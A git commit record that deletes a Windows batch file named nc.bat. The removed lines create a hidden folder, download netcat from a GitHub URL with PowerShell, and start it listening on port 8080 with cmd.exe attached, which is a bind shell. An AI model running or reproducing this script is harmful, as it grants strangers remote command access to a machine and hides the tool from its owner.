7590a400c3219e1d1713c10a64e561df1420456d
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-09-28 21:02:03 -0400

    Delete nc.bat

--- nc.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-mkdir C:\nc\
-attrib +h C:\nc
-powershell.exe (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc.exe','C:\nc\nc.exe')
-
-C:\nc\nc.exe -lvp 8080 -e cmd.exe
